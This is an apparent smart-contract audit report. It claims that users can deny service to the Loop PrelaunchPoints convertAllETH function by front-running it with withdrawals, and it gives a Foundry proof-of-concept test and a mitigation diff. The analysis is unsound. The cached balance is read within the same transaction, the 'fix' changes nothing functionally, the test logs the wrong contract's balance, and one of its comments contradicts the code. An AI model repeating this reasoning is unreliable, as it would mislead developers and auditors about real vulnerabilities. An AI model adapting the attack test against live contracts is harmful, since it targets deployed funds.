# Vulnerability details

## Impact

Inability to start claim date

## Proof of Concept

[convertAllETH](https://github.com/code-423n4/2024-05-loop/blob/40167e469edde09969643b6808c57e25d1b9c203/src/PrelaunchPoints.sol#L315-L318) is called by the owner when the `loopActivation` time is at least past 1 week in order to convert all the locked ETH to get lpETH.

```solidity
Contract: PrelaunchPoints.sol

315:     function convertAllETH() external onlyAuthorized onlyBeforeDate(startClaimDate) {
316:         if (block.timestamp - loopActivation <= TIMELOCK) {
317:             revert LoopNotActivated();
318:         }
319:
320:         // deposits all the ETH to lpETH contract. Receives lpETH back
321:         uint256 totalBalance = address(this).balance;
322:         lpETH.deposit{value: totalBalance}(address(this));
323:
324:         totalLpETH = lpETH.balanceOf(address(this));
325:
326:         // Claims of lpETH can start immediately after conversion.
327:         startClaimDate = uint32(block.timestamp);
328:
329:         emit Converted(totalBalance, totalLpETH);
330:     }
331:
```

As seen at L: 321, the total ETH balance is cached to `totalBalance` variable to deposit to `lpETH` contract at L: 322.

However, this brings a significant risk of contract being DOS'ed.
Accordingly, a malicious user can frontrun the `convertAllETH` call by `withdraw` call.
The attacker can do this as much as their locked funds from different addresses.

The idea of the attack is to diminish the ETH balance of the contract while the same balance was cached to `totalBalance` variable to deposit.
Accordingly, the stake will not be possible due to not possessing of the cached `totalBalance`

### Coded POC

Please paste below test in `PrelaunchPoints.t.sol` file and test it with `-vvvv` verbosity.
The test shows that total LpETH after frontrun attack is 0 and the contract's ETH balance remains the same.

```solidity
function testConvertAllETHFrontRunByUserWithdraw() public {
        uint256 lockAmount = 10 ether;
        address user = address(0x1337); // Attacker address


        // Provide user with ETH to lock
        vm.deal(user, lockAmount);

        uint256 balanceUserBefore = address(user).balance;
        console.log("Balance of user after Deal",balanceUserBefore);

        // User locks ETH
        vm.startPrank(user);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        uint256 balanceUserAfterLockCall = address(user).balance;
        console.log("Balance of user after Lock",balanceUserAfterLockCall);

        vm.stopPrank();

        uint256 balanceBefore = address(this).balance;
        console.log("Balance of the contract Before convertAll call", balanceBefore);

        // Simulate the setting of loop addresses, which signifies the start of the activation period.
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        // Fast forward to just after activation but before enough time has passed for `convertAllETH` to succeed.
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);

        // User tries to withdraw their ETH, which should be allowed.
        vm.startPrank(user);
        prelaunchPoints.withdraw(ETH);
        uint256 balanceUserAfterLockWithdraw = address(user).balance;
        console.log("Balance of user after Withdraw",balanceUserAfterLockWithdraw);

        vm.stopPrank();

        uint256 balanceAfter = address(this).balance;
        console.log("Balance of the contract After convertAll call", balanceAfter);


        // Now the contract's balance is manipulated, attempt to convert all ETH to lpETH should fail and total LP ETH should be 0.

        prelaunchPoints.convertAllETH();
        assertEq(prelaunchPoints.totalLpETH(), 0);

    }

```

## Recommended Mitigation Steps

Don't cache the balance and refactor the code to below;

```diff
-         uint256 totalBalance = address(this).balance;
-         lpETH.deposit{value: totalBalance}(address(this));
+         lpETH.deposit{value: address(this).balance}(address(this));
```
